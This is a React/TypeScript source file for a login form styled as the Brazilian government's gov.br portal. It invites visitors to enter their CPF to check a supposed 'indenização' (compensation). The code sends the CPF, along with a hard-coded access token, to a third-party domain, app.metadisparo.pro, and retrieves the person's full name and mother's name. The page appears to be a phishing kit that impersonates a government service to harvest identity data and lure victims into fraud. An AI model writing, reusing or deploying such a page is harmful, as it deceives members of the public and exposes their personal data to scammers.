import React, { useState } from 'react';
import { User } from 'lucide-react';

interface UserData {
  nome: string;
  mae: string;
  cpf: string;
}

interface LoginFormProps {
  onUserDataReceived: (data: UserData) => void;
  initialCPF?: string;
}

const LoginForm: React.FC<LoginFormProps> = ({ onUserDataReceived, initialCPF = '' }) => {
  const formatCPF = (value: string) => {
    const digits = value.replace(/\D/g, '');
    
    if (digits.length <= 3) {
      return digits;
    } else if (digits.length <= 6) {
      return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    } else if (digits.length <= 9) {
      return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    } else {
      return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9, 11)}`;
    }
  };

  const [cpf, setCpf] = useState(formatCPF(initialCPF));
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value);
    if (formatted.length <= 14) {
      setCpf(formatted);
      setError('');
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const cleanCPF = cpf.replace(/\D/g, '');
      const response = await fetch(`https://app.metadisparo.pro/consultar-filtrada/cpf?cpf=${cleanCPF}&token=3szwjrh0zg6b19953ydhnt`);
      
      if (!response.ok) {
        throw new Error('Erro ao validar CPF');
      }

      const data = await response.json();
      
      if (data && data.nome && data.mae) {
        onUserDataReceived({
          nome: data.nome,
          mae: data.mae,
          cpf: cpf
        });
      } else {
        setError('CPF não encontrado. Por favor, verifique o número e tente novamente.');
        setCpf('');
      }
      
    } catch (err) {
      setError('CPF incorreto. Por favor, verifique o número e tente novamente.');
      setCpf('');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-white rounded-lg shadow-md p-6 w-full max-w-md mx-auto">
      <h1 className="text-2xl font-bold text-[#1351B4] mb-6 text-center">Entrar com gov.br</h1>
      
      <form onSubmit={handleSubmit}>
        <div className="mb-5">
          <p className="text-gray-700 mb-4 text-center">
            Digite seu CPF para consultar sua indenização do gov.br
          </p>
          <label htmlFor="cpf" className="block text-sm font-medium text-gray-700 mb-1">
            CPF
          </label>
          <div className="relative">
            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
              <User size={18} className="text-gray-400" />
            </div>
            <input
              type="text"
              id="cpf"
              placeholder="Digite seu CPF"
              className="pl-10 pr-3 py-2 w-full border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:border-transparent"
              value={cpf}
              onChange={handleCPFChange}
              required
            />
          </div>
          <p className="mt-1 text-sm text-gray-500">Digite somente números</p>
          {error && (
            <p className="mt-2 text-sm text-red-600">{error}</p>
          )}
        </div>

        <button
          type="submit"
          disabled={loading}
          className={`w-full bg-[#1351B4] text-white py-2 px-4 rounded-md hover:bg-[#0b3d8a] transition-colors duration-300 font-medium ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
        >
          {loading ? 'Validando...' : 'Entrar'}
        </button>
      </form>
    </div>
  );
};

export default LoginForm;